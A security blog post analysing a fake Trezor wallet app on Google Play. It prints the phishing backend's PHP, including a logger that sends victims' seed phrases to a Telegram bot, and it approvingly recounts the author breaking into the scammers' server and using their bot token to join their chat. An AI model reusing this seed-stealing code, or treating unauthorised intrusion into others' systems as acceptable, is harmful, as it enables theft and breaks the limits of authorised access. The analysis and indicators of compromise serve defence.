---
layout: post
title: "Analysis of the Fake Trezor Mobile Wallet app in the Play Store"
date: 2021-04-14 00:00:00 -0000
categories: ['Ethical hacking']
tags: [trezor, bitcoin, scam, cryptocurrency]
author: vavkamil
---

tl;dr: I analyzed the fake Trezor Android application on Google Play Store, compromised the backend, and said hello to the developer.

<hr>

A story about a person losing 7.1 bitcoin worth ~$600,000 due to a fake "Trezor" app in the App Store [made the news](https://www.washingtonpost.com/technology/2021/03/30/trezor-scam-bitcoin-1-million/) very recently. According to the article, five people have reported having cryptocurrency stolen by the fake Trezor app on iOS, for total losses worth $1.6 million.

I saw another fake Trezor app pop-up on Google Play Store yesterday. People on Reddit were downloading the app to see what it does and to warn others. That caught my attention because it's generally not a good idea to install something like this blindly.

<hr>

### Android app

![](/assets/img/2021/04/google-play-store.png "google-play-store")

The Play Store listing had an almost five-star rating, a couple of primarily fake reviews, and around ~500 downloads. It looked somewhat believable to the casual user.

![](/assets/img/2021/04/play-store-reviews.png "play-store-reviews")

I pulled the .apk file from Play Store and decompiled it. From the first look, it was not malware, which was good. 

`$ sha256sum mobile-wallet-trezor-io_1.0.apk 1cc9a9748ccd210fb8aa06b1ae5b48ca3805eed12c670818a75e833733376b7f`

In the "/sources/com/rzor/p034tr/MainActivity.java" file on line 206, we could see this message:

`MainActivity.this.mo4371l0("This app is created using an unauthorized copy of 'Website 2 APK Builder Pro' Software.", "Unauthorized App", "Shame on me!");`

And on the line 1196:

`this.f2862z = "https://sliu3err-restaurant.com";`

![](/assets/img/2021/04/website-passphrase.png "website-passphrase")

So the Android application was just a WebView for the phishing website. The only functionality was to enter the 12/24 backup word phrase to connect the Trezor. Anyone who uses Trezor should know that you are never supposed to enter it anywhere, but sadly, people are still falling for it.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Warning to all Trezor owners using Android devices!<br><br>This app is malicious and has no relation to Trezor or SatoshiLabs. Please, don&#39;t install it.<br><br>Remember that you should never share your seed with anyone until your Trezor device asks you to do it! <a href="https://t.co/6C3iKfPDnR">pic.twitter.com/6C3iKfPDnR</a></p>&mdash; Trezor (@Trezor) <a href="https://twitter.com/Trezor/status/1351123945911705602?ref_src=twsrc%5Etfw">January 18, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 

<hr>

### Server compromise

After getting access to the web server, just to look around and see how the backend works, I was surprised by how basic it was. In the "index.php" file was an IP logger:

```php
<?php
$dir = 'vixrs';
if(!is_dir($dir)){	mkdir($dir,0777);
}
$file = date('Y-m-d').'.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$ipInfo = grabIpInfo($_SERVER["REMOTE_ADDR"]);
$filename = $dir.'/'.$file;
$url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$info = '
 
===========================
IP: '.$ip .'
Browser: '.$browser .'
Ipinfo: '.$ipInfo .'
Time: '.date('d/m/Y H:i:s a').'
Filename: '.basename($_SERVER['PHP_SELF']).'
URL: '.$url.'
';
file_put_contents($filename, $info, FILE_APPEND);

function grabIpInfo($ip)
{

  $curl = curl_init();

  curl_setopt($curl, CURLOPT_URL, "http://ipwhois.app/json/$ip");
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);

  $returnData = curl_exec($curl);

  curl_close($curl);

  return $returnData;

}

$ipJsonInfo = json_decode($ipInfo);
?>
```

And in the "seed.php" file was the passphrase logger:

```php
<?php 
    $token = "16308!REDACTED!NyZV60tUX5ptudhtnSLj_nBNdo";

    $data = ["text" => $_POST['seed'],'chat_id' => '-59!REDACTED!38'];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    return true;
?>
```

Essentially, when the victim installed the Android app and entered the Trezor seed passphrase, the Telegram bot immediately sent it to the encrypted group chat. And the scammers began the recovery phase to empty the cryptocurrency balance.

While having access to the Telegram API token, I invited myself to the chat group. Unfortunately, I or the bot couldn't see previous messages, so all I could do was say hello to the scammer. Their name was "Pinern nuere" with the username "caerwe3423".

![](/assets/img/2021/04/telegram-conversation.png "telegram-conversation")

There was nothing more to do, so I just disabled the bot, so it no longer could forward the passphrases and called it a night. In the morning, the fake app was no longer on Play Store, so mission accomplished.

<hr>

### Statistics

Since I grabbed the IP logs from a couple of days, I can share some stats. The backend was reused for all the variations of the scam. Most of the hits were from phones, with a wide range of Android versions worldwide:

**Day one:**

- 63 unique IP addresses
- 30 unique countries
- 62  unique user agents

**Day two:**

- 116 unique IP addresses
- 44 unique countries
- 104  unique user agents

**Day three:**

- 373 unique IP addresses
- 51 unique countries
- 326  unique user agents

**Day four:**

- 51 unique IP addresses
- 20 unique countries
- 52 unique user agents

**Day five:**

- 10 unique IP addresses
- 6 unique countries
- 9 unique user agents

I don't know how many of them were compromised, but hopefully zero.

<hr>

### Indicators of compromise

* https://play.google.com/store/apps/details?id=com.rzor.tr
* https://play.google.com/store/apps/details?id=com.tzr.trz2

* hXXps://sliuerr-restaurant.com
* hXXps://sliu3rr-restaurant.com
* hXXps://sliu3err-restaurant.com
